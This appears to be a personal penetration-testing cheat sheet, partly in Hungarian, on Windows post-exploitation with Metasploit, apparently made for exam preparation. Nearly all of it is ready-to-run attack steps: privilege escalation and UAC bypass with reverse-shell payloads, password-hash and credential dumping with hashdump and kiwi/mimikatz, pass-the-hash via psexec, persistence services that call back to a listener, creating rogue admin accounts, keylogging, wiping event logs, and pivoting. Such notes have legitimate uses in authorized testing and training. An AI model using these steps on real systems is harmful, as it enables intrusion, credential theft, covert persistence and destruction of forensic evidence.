# windows post exploitation
## basic meterpreter things
* meterpreter> getsystem (elevate SYSTEM privileges from Administrator priv)
* meterpreter> hashdump
* meterpreter> show_mount
* meterpreter> ps
* meterpreter> migrate 2212
* meterpreter> migrate -N lsass.exe
## list saves files with enumeration information
* msf6> loot (list all file that is saved with enumeration information)
## msf post exploitation modules
* msf6> use post/multi/manage/shell_to_meterpreter
* msf6> use post/multi/manage/archmigrate
* msf6> use post/multi/manage/migrate (create new process and migrate to it)
* msf6> use post/windows/gather/win_privs
* msf6> use post/windows/gather/enum_logged_on_users
* msf6> use post/windows/gather/checkvm (check if the victim machine is a virtual machine or not)
* msf6> use post/windows/gather/enum_applications (applications and versions)
* msf6> loot (list all file that is saved with enumeration information)
* msf6> use post/windows/gather/enum_av_excluded (installed antivirus)
* msf6> use post/windows/gather/enum_computers (list other computers on the same domain of victim machine)
* msf6> use post/windows/gather/enum_patches
  * maybe need to migrate to another process to run successfully
  * or run native systeminfo from native shell instead of meterpreter
* msf6> use post/windows/gather/enum_shares
* msf6> use post/windows/manage/enable_rdp (build rdp session)
## bypassing UAC
* initial command
  * sysinfo, getuid, getsystem (probably will fail, if not - no UAC bypass needed at all), getprivs
  * shell > net users
  * shell > net localgroup administrators (our user should be in administrators group)
* msf6> use exploit/windows/local/bypassuac_injection
  * (lots of other bypassuac modules are exists!!!)
  * msf6 exploit(windows/local/bypassuac_injection)> set payload windows/x64/meterpreter/reverse_tcp
    * if OS is x86 - we need x86, if OS is x64 - we need x64
  * lehet hogy a targetet is at kell allitani x64 vagy x86-ra
    * msf6 exploit(windows/local/bypassuac_injection)> show targets
    * msf6 exploit(windows/local/bypassuac_injection)> set target 1 (or set target 2)
  * meterpreter> getsystem (most mar sikerulni fog)
  * meterpreter> hashdump (a masodik hash az ntlm hash - azt kell megtorni) (hashcat -m 1000)
## token impersonation with incognito
### info
* windows access token types
  * impersonate-level token: system services, domain logons  (works just on local system)
  * delegate-level token: simple physical login, rdp ((works globally at any system)
* privileges that can be used to do an impersonation attack
  * SeAssignPrimaryToken (allows a user to impersonate tokens)
  * SeCreateToken (allows a user to create arbitrary token with admin privs)
  * SeImpersonatePrivilege (allows a user to create a process - tipically with admin privs - under the security context of another user)
* if we exploit a service - often we have an "NT AUTHORITY\LOCAL SERVICE" access
### msf incognito modul
* meterpreter> load incognito
* meterpreter> list_tokens -u (list the tokens available)
* meterpreter> impersonate_token "LOCAL_NETWORK1\Administrator"
* meterpreter> migrate XXXX
  * it is needed in lots of situations because "NT AUTHORITY\LOCAL SERVICE" user has limited capabilities
  * perfect target process is "explorer.exe" (should be fine)
## dumping hashes with kiwi modul (mimikatz kiwi)
### info
* inital commands
  * sysinfo, migrate XXX
* administrator privileges needed
* optionally we can migrate to lsass.exe (not sure if it is needed or not)
* maybe kiwi needs x64 meterpreter...
## steps
* meterpreter> load kiwi
* meterpreter> creds_all
* meterpreter> lsa_dump_sam
* meterpreter> lsa_dump_secrets
## PassTheHash attack (PtH) with PsExec
### info
* gathering hashes or plain text passwords
* authenticate with PsExec via SMB (using the stolen hash or password)
* it is a legitimate connection with valid credentials (and not a service exploitation technique)
### steps
* initial commands: getuid, sysinfo, pgrep lsass, migrate XXX
* get hashes
  * example 1: meterpreter> hashdump
  * example 2: meterpreter> load kiwi | meterpreter> creds_all
* run psexec module
  * msf6> use exploit/windows/smb/psexec
  * msf6 exploit(windows/smb/psexec)> set payload windows/x64/meterpreter/reverse_tcp (if target system is x64)
  * msf6 exploit(windows/smb/psexec)> set SMBUser <user>
  * msf6 exploit(windows/smb/psexec)> set SMBPass <pass> (clear text cred can be pasted here)
  * msf6 exploit(windows/smb/psexec)> set SMBDomain <domain> or . (or just dont set this at all)
  * msf6 exploit(windows/smb/psexec)> run
  * if we already has an active meterperter session it will maybe open another session (and not modify the existing session)
## persistance with msf module
### VIZSGAN NEM BIZTOS HOGY JO OTLET MERT MEG TUD HULYULNI TOLE A GEP ES AZTAN CSESZHETEM !!!!
### steps
* initial commands: sysinfo, getuid
* msf6> search platform:windows persistance
* msf6> use exploit/windows/local/persistance (akkor kapunk ujra access-t amikor a gep ujraindul) (nem kielegito minosegu cucc vizsga kornyezetben)
* msf6> use exploit/windows/local/persistance_service (creates a windows service and always tries to connect back to our listener)
* msf6 exploit(windows/local/persistance_service)> set payload windows/x64/meterpreter/reverse_tcp
* msf6 exploit(windows/local/persistance_service)> set remote_exe_name <name>
* msf6 exploit(windows/local/persistance_service)> set remote_exe_path <path>
* msf6 exploit(windows/local/persistance_service)> set service_name <service_name>
* msf6 exploit(windows/local/persistance_service)> set session 1
* msf6 exploit(windows/local/persistance_service)> run
### info
* maybe only x86 payload will be worked with it!!!!!
  * of course we can later upgrade it to x64
* get connection back
  * multi/handler ... run ... es mar connectel is
* tetszoleges szamu meterpreter session-t nyithatunk a multi/handler-rel, es barmikor bezarhatjuk, ujranyithatjuk oket...
## enabling RDP on victim machine
### info
* default port: 3389
* needs username + clear text password
* rdp needs to be enabled
### steps
* getuid, sysinfo, getsystem...
* msf6> use post/windows/manage/enable_rdp
* msf6 (post/windows/manage/enable_rdp)> set SESSION 1
* msf6 (post/windows/manage/enable_rdp)> run
* (check with nmap if 3389/tcp is open)
* get credentials
  * change password of a user (in this case the administrator user) (ADMIN PRIV NEEDED!!!!)
    * net user administrator <new_pass>
  * create new user with arbitrary password and add him to the administrators group (ADMIN PRIV NEEDED!!!!)
    * net user user2 Pass123456 /add && net localgroup administrators user2 /add
  * dump and crack hashes, dump clear text passwords with mimikatz, ...
* connect throught rdp
  * xfreerdp /v:10.10.10.2 /u:administrator /p:Password1234 [/dynamic-resolution]
## keylogging
* migrate to explorer.exe
* meterpreter> keyscan_start
* meterpreter> keyscan_stop
* meterpreter> keyscan_dump
## clearing windows event logs
* meterpreter> clearev (az osszes event logot kitorli mindenhonnan - Application, Security, System)
## pivoting with metasploit
* getuid, sysinfo,...
* meterpreter> ipconfig
  * check the other network cards of the victim machine
* meterpreter> run autoroute -s 10.10.10.0/24 (add autoroute)
  * only works with msf module (probably db_nmap is not working here)
* (meterpreter> sessions -n <new_session_name> -i 1) (add a name to the session)
* meterpreter> use auxiliary/scanner/portscan/tcp (pivoting - portscan victim2 - through victim1) 
* meterpreter (auxiliary/scanner/portscan/tcp)> set ports 1-1000
* meterpreter (auxiliary/scanner/portscan/tcp)> run
* you can use modules to scan http banner, http version, or some curl equivalent through autoroute...
  * instead of nmap and curl...
* 
